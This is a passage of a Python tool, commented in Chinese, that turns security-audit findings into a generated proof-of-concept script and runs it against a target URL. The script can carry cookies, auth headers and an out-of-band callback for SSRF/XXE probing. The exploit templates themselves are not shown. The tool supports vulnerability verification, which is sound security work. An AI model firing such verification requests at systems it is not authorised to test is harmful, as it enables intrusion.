                    print(f"  ⚠️ 高度疑似: {{conclusion}}", file=sys.stderr)
                elif v == "not_vulnerable":
                    not_vulnerable_count += 1
                    print(f"  ❌ 未发现漏洞: {{conclusion}}", file=sys.stderr)
                elif v == "error":
                    print(f"  💥 错误: {{conclusion}}", file=sys.stderr)
                else:
                    inconclusive_count += 1
                    print(f"  ❓ 无法判定: {{conclusion}}", file=sys.stderr)
                # 兼容旧格式: 从 verdict 推导 vulnerable/suspicious
                if v in ("confirmed", "likely"):
                    for r in result.get("results", result.get("evidence", [])):
                        if isinstance(r, dict):
                            r.setdefault("suspicious", True)

            results.append(result)

        return {{
            "generatedAt": time.strftime("%Y-%m-%d %H:%M:%S"),
            "baseUrl": base_url,
            "totalTested": total,
            "confirmedCount": confirmed_count,
            "likelyCount": likely_count,
            "notVulnerableCount": not_vulnerable_count,
            "inconclusiveCount": inconclusive_count,
            "vulnerableCount": confirmed_count + likely_count,
            "results": results,
        }}


    def main():
        parser = argparse.ArgumentParser(
            description="POC 验证脚本 — 对审计发现的漏洞发送实际验证请求",
            formatter_class=argparse.RawDescriptionHelpFormatter,
        )
        parser.add_argument("--base-url", required=True,
                           help="目标服务基础 URL（如 http://localhost:8080）")
        parser.add_argument("--finding", action="append", default=None,
                           help="仅验证指定的 findingId（可多次指定）")
        parser.add_argument("--cookie", default=None,
                           help="Cookie 字符串（如 'session=abc123; token=xyz'）")
        parser.add_argument("--header", action="append", default=None,
                           help="自定义请求头（如 'Authorization: Bearer xxx'，可多次指定）")
        parser.add_argument("--callback-url", default=None,
                           help="带外回调 URL（用于 SSRF/XXE 的 OOB 探测）")
        parser.add_argument("--output", "-o", default=None,
                           help="输出验证结果到 JSON 文件（默认输出到 stdout）")
        parser.add_argument("--quiet", action="store_true",
                           help="静默模式（仅输出 JSON 结果）")

        args = parser.parse_args()

        # 配置请求头
        headers = {{}}
        if args.header:
            for h in args.header:
                if ":" in h:
                    key, value = h.split(":", 1)
                    headers[key.strip()] = value.strip()

        # 配置 Cookie
        cookies = {{}}
        if args.cookie:
            for part in args.cookie.split(";"):
                if "=" in part:
                    key, value = part.strip().split("=", 1)
                    cookies[key.strip()] = value.strip()

        # 配置全局 session
        session.headers.update(headers)
        session.cookies.update(cookies)

        if not args.quiet:
            print(f"\\n{'='*60}", file=sys.stderr)
            print(f"  POC 验证脚本", file=sys.stderr)
            print(f"  目标: {{args.base_url}}", file=sys.stderr)
            print(f"  待验证: {{len(POC_REGISTRY)}} 个漏洞", file=sys.stderr)
            print(f"{'='*60}\\n", file=sys.stderr)

        # 运行
        report = run_all_pocs(
            args.base_url,
            finding_filter=set(args.finding) if args.finding else None,
            headers=headers,
            cookies=cookies,
            callback_url=args.callback_url,
        )

        json_output = json.dumps(report, ensure_ascii=False, indent=2)

        if args.output:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(json_output)
            if not args.quiet:
                print(f"\\n验证结果已保存: {{args.output}}", file=sys.stderr)
        else:
            print(json_output)

        # 摘要
        if not args.quiet:
            print(f"\\n{'='*60}", file=sys.stderr)
            print(f"  验证完成", file=sys.stderr)
            print(f"  测试总数:   {{report['totalTested']}}", file=sys.stderr)
            print(f"  ✅ 已确认:  {{report['confirmedCount']}}", file=sys.stderr)
            print(f"  ⚠️ 疑似:   {{report['likelyCount']}}", file=sys.stderr)
            print(f"  ❌ 未发现:  {{report['notVulnerableCount']}}", file=sys.stderr)
            print(f"  ❓ 待定:   {{report['inconclusiveCount']}}", file=sys.stderr)
            print(f"{'='*60}", file=sys.stderr)


    if __name__ == "__main__":
        main()
""")


def generate_poc_script(manifest, batch_id=''):
    """根据 POC 清单生成完整的可执行 POC 脚本文件内容。

    Args:
        manifest: build_poc_manifest 的输出
        batch_id: 审计批次 ID

    Returns:
        str: 完整的 Python 脚本内容
    """
    generated_at = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')

    # 生成脚本头部
    header = _SCRIPT_HEADER.format(
        generated_at=generated_at,
        batch_id=batch_id or 'unknown',
        total_findings=len(manifest),
    )

    # 生成各 finding 的 POC 函数
    functions = []
    poc_registry = []

    for entry in manifest:
        template_key = entry['templateKey']
        finding_id = entry['findingId']
        func_name = entry['pocFunctionName']
        file_path = entry['filePath']
        line_number = entry['lineNumber']
        risk_type = entry['riskType']
        description = entry.get('description', '')
        endpoint = entry.get('endpointInfo', {})

        # 选择模板
        if template_key in POC_TEMPLATES:
            template = POC_TEMPLATES[template_key]['template']
        else:
            template = GENERIC_POC_TEMPLATE['template']

        # 替换占位符
        code = template.format(
            findingId=finding_id,
            filePath=file_path,
            lineNumber=line_number,
            riskType=risk_type,
            description=description.replace('"', '\\"').replace('\n', ' ')[:150],
            safe_id=_safe_func_id(finding_id),
        )

        # 如果函数名与模板默认名不同，进行替换
        default_func_name = f"poc_{template_key.replace('-', '_')}" if template_key in POC_TEMPLATES else f"poc_generic_{_safe_func_id(finding_id)}"
        if func_name != default_func_name:
            code = code.replace(f"def {default_func_name}(", f"def {func_name}(", 1)

        functions.append(code)

        # 注册表条目
        poc_registry.append({
            'findingId': finding_id,
            'funcName': func_name,
            'riskType': risk_type,
            'severity': entry['severity'],
            'templateKey': template_key,
            'endpoint': endpoint,
        })

    # 拼接完整脚本
    script = header
    script += "\n# " + "=" * 75 + "\n"
    script += "# POC 验证函数\n"
    script += "# " + "=" * 75 + "\n\n"

    for func_code in functions:
        script += func_code + "\n\n"

    # 生成运行器（包含注册表）
    # 注意：_SCRIPT_RUNNER 模板使用 {{ }} 作为转义，需要替换为单花括号
    registry_json = json.dumps(poc_registry, ensure_ascii=False, indent=4)
    runner = _SCRIPT_RUNNER.replace('{poc_registry}', registry_json)
    # 将模板中的双花括号替换为单花括号
    runner = runner.replace('{{', '{').replace('}}', '}')
    script += runner

    return script


# ---------------------------------------------------------------------------
# 子命令: generate
# ---------------------------------------------------------------------------

def run_generate(batch_dir, input_file=None, output_dir=None):
    """生成 POC 验证脚本和清单。

    Args:
        batch_dir: 审计批次目录
        input_file: 输入文件路径（默认自动检测 score-results.json / merged-scan.json / finding-*.json）
        output_dir: 输出目录（默认 batch_dir）
    """
    batch_path = Path(batch_dir)
    out_path = Path(output_dir) if output_dir else batch_path

    # 加载 findings
    findings = []
    source_file = ''

    if input_file:
        fp = Path(input_file) if os.path.isabs(input_file) else batch_path / input_file
        data = load_json_file(fp)
        if data:
            findings = data.get('findings', data.get('RiskList', []))
            source_file = str(fp.name)
            log_info(f"从 {fp.name} 加载 {len(findings)} 个 findings")
    else:
        # 自动检测输入源（优先级：score-results > merged-scan > finding-*.json）
        for candidate in [
            'score-results.json',
            'merged-scan.json',
        ]:
            data = load_json_file(batch_path / candidate)
            if data and data.get('findings'):
                findings = data['findings']
                source_file = candidate
                log_info(f"从 {candidate} 加载 {len(findings)} 个 findings")
                break

        # 回退到 finding-*.json 文件
        if not findings:
            for fp in sorted(batch_path.glob('finding-*.json')):
                data = load_json_file(fp)
                if data:
                    risk_list = data.get('RiskList', data.get('issues', []))
                    findings.extend(risk_list)
            if findings:
                source_file = 'finding-*.json'
                log_info(f"从 finding-*.json 文件加载 {len(findings)} 个 findings")

    if not findings:
        log_warn("未找到任何 findings，跳过 POC 生成")
        stdout_json({"status": "skip", "message": "no findings found"})
        return

    # 按严重性排序（高优先）
    findings.sort(key=lambda f: SEVERITY_ORDER.get(
        (f.get('severity') or f.get('RiskLevel') or 'low').lower(), 0
    ), reverse=True)

    # 生成 POC 清单
    manifest = build_poc_manifest(findings)
    log_info(f"已生成 {len(manifest)} 条 POC 清单")

    # 统计各模板使用情况
    template_stats = {}
    for entry in manifest:
        tk = entry['templateKey']
        template_stats[tk] = template_stats.get(tk, 0) + 1
    for tk, cnt in sorted(template_stats.items(), key=lambda x: -x[1]):
        log_info(f"  {tk}: {cnt} 个 POC")

    # 获取 batch_id
    batch_id = batch_path.name

    # 生成 POC 脚本
    script_content = generate_poc_script(manifest, batch_id=batch_id)
    script_path = out_path / 'poc-scripts.py'
    script_path.parent.mkdir(parents=True, exist_ok=True)
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(script_content)
    # 设置可执行权限
    os.chmod(script_path, 0o755)
    log_ok(f"POC 脚本已生成: {script_path}")

    # 生成 POC 清单 JSON
    manifest_data = {
        'generatedAt': datetime.now(timezone.utc).isoformat(),
        'batchId': batch_id,
        'sourceFile': source_file,
        'totalFindings': len(findings),
        'totalPocs': len(manifest),
        'templateStats': template_stats,
        'usage': {
            'description': 'POC 验证脚本使用说明',
            'runAll': f'python3 poc-scripts.py --base-url http://your-target:8080',
            'runWithAuth': f'python3 poc-scripts.py --base-url http://your-target:8080 --cookie "session=abc" --header "Authorization: Bearer <token>"',
            'runSingle': f'python3 poc-scripts.py --base-url http://your-target:8080 --finding f-001',
            'saveResults': f'python3 poc-scripts.py --base-url http://your-target:8080 --output poc-results.json',
        },
        'manifest': manifest,
    }
    manifest_path = out_path / 'poc-manifest.json'
    write_json_file(manifest_path, manifest_data)
    log_ok(f"POC 清单已生成: {manifest_path}")

    # stdout 摘要
    stdout_json({
        "status": "ok",
        "totalFindings": len(findings),
        "totalPocs": len(manifest),
        "templateStats": template_stats,
        "scriptFile": "poc-scripts.py",
        "manifestFile": "poc-manifest.json",
        "usage": f"python3 {script_path} --base-url http://your-target:8080",
    })


# ---------------------------------------------------------------------------
# 子命令: run
# ---------------------------------------------------------------------------

def run_poc(batch_dir, base_url, finding_filter=None, cookie=None,
            headers_list=None, callback_url=None, output_file=None):
    """执行 POC 验证（调用生成的脚本）。

    此函数通过子进程执行 poc-scripts.py，收集结果并更新 poc-manifest.json。
    """
    import subprocess

    batch_path = Path(batch_dir)
    script_path = batch_path / 'poc-scripts.py'

    if not script_path.exists():
        log_error(f"POC 脚本不存在: {script_path}，请先执行 generate 子命令")
        stdout_json({"status": "error", "message": "poc-scripts.py not found"})
        sys.exit(1)

    cmd = [sys.executable, str(script_path), '--base-url', base_url]
    if finding_filter:
        for fid in finding_filter:
            cmd.extend(['--finding', fid])
    if cookie:
        cmd.extend(['--cookie', cookie])
    if headers_list:
        for h in headers_list:
            cmd.extend(['--header', h])
    if callback_url:
        cmd.extend(['--callback-url', callback_url])

    out_file = output_file or str(batch_path / 'poc-results.json')
    cmd.extend(['--output', out_file])

    log_info(f"执行 POC 脚本: {' '.join(cmd[:4])}...")

    try:
        result = subprocess.run(cmd, capture_output=False, text=True, timeout=300)
        if result.returncode == 0:
            log_ok(f"POC 验证完成，结果已保存: {out_file}")
            # 读取结果并输出摘要
            poc_results = load_json_file(out_file)
            if poc_results:
                stdout_json({
                    "status": "ok",
                    "totalTested": poc_results.get('totalTested', 0),
                    "confirmedCount": poc_results.get('confirmedCount', 0),
                    "likelyCount": poc_results.get('likelyCount', 0),
                    "vulnerableCount": poc_results.get('vulnerableCount', 0),
                    "outputFile": os.path.basename(out_file),
                })
            else:
                stdout_json({"status": "ok", "outputFile": os.path.basename(out_file)})
        else:
            log_error(f"POC 脚本执行失败，返回码: {result.returncode}")
            stdout_json({"status": "error", "message": f"exit code {result.returncode}"})
    except subprocess.TimeoutExpired:
        log_error("POC 脚本执行超时（300s）")
        stdout_json({"status": "error", "message": "timeout"})
    except Exception as e:
        log_error(f"POC 脚本执行异常: {e}")
        stdout_json({"status": "error", "message": str(e)})


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description='POC 验证脚本生成器：为审计发现的漏洞生成可执行的验证脚本',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
子命令说明：
  generate   读取审计结果，为每个漏洞生成 POC 验证脚本和清单
  run        执行生成的 POC 脚本，对目标服务发送实际验证请求

示例：
  # 生成 POC 脚本
  %(prog)s generate --batch-dir security-scan-output/project-deep-20260407120000

  # 从指定输入文件生成
  %(prog)s generate --batch-dir security-scan-output/project-deep-20260407120000 --input merged-scan.json

  # 执行 POC 验证
  %(prog)s run --batch-dir security-scan-output/project-deep-20260407120000 --base-url http://localhost:8080

  # 带认证执行
  %(prog)s run --batch-dir security-scan-output/project-deep-20260407120000 \\
    --base-url http://localhost:8080 \\
    --cookie "session=abc123" \\
    --header "Authorization: Bearer xxx"

  # 仅验证指定漏洞
  %(prog)s run --batch-dir security-scan-output/project-deep-20260407120000 \\
    --base-url http://localhost:8080 --finding f-001 --finding f-002
        """
    )
    subparsers = parser.add_subparsers(dest='command')

    # generate
    sp_gen = subparsers.add_parser('generate',
                                    help='生成 POC 验证脚本和清单')
    sp_gen.add_argument('--batch-dir', required=True,
                        help='审计批次目录路径')
    sp_gen.add_argument('--input', default=None,
                        help='输入文件路径（默认自动检测 score-results.json / merged-scan.json）')
    sp_gen.add_argument('--output-dir', default=None,
                        help='输出目录（默认与 batch-dir 相同）')

    # run
    sp_run = subparsers.add_parser('run',
                                    help='执行 POC 验证脚本')
    sp_run.add_argument('--batch-dir', required=True,
                        help='审计批次目录路径')
    sp_run.add_argument('--base-url', required=True,
                        help='目标服务基础 URL（如 http://localhost:8080）')
    sp_run.add_argument('--finding', action='append', default=None,
                        help='仅验证指定 findingId（可多次指定）')
    sp_run.add_argument('--cookie', default=None,
                        help='Cookie 字符串')
    sp_run.add_argument('--header', action='append', default=None,
                        help='自定义请求头（可多次指定）')
    sp_run.add_argument('--callback-url', default=None,
                        help='带外回调 URL（OOB 探测用）')
    sp_run.add_argument('--output', default=None,
                        help='验证结果输出文件路径')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    if args.command == 'generate':
        batch_dir = Path(args.batch_dir)
        if not batch_dir.is_dir():
            log_error(f"批次目录不存在: {batch_dir}")
            stdout_json({"status": "error", "message": f"batch dir not found: {batch_dir}"})
            sys.exit(1)
        run_generate(batch_dir, input_file=getattr(args, 'input', None),
                     output_dir=getattr(args, 'output_dir', None))

    elif args.command == 'run':
        batch_dir = Path(args.batch_dir)
        if not batch_dir.is_dir():
            log_error(f"批次目录不存在: {batch_dir}")
            stdout_json({"status": "error", "message": f"batch dir not found: {batch_dir}"})
            sys.exit(1)
        run_poc(batch_dir, base_url=args.base_url,
                finding_filter=args.finding, cookie=args.cookie,
                headers_list=args.header, callback_url=args.callback_url,
                output_file=args.output)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        log_warn("用户中断操作")
        sys.exit(130)
    except Exception as e:
        log_error(f"未预期的错误: {e}")
        import traceback
        traceback.print_exc(file=sys.stderr)
        stdout_json({"status": "error", "message": str(e)})
        sys.exit(1)
